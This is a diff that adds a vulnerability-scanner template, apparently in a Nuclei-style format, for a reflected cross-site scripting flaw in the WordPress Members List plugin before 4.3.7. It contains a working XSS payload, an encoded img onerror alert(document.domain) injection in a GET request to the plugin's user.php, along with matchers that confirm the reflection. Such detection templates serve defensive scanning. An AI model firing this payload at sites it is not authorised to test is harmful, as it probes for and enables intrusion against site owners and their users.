@@ -1,0 +1,33 @@
+id: members-list-xss
+brief:
+    title: WordPress Members List <4.3.7 - Cross-Site Scripting
+    by: Akincibor
+    level: medium
+    about: WordPress Members List 4.3.7 does not sanitize and escape some parameters in various pages before outputting them back, leading to reflected cross-site scripting vulnerabilities.
+    label:
+        - wp
+        - wordpress
+        - wp-plugin
+        - xss
+        - wpscan
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x'
+      signs:
+        - "on": word
+          has:
+            - '"><img src onerror=alert(document.domain) x'
+            - wrap tern-wrap
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
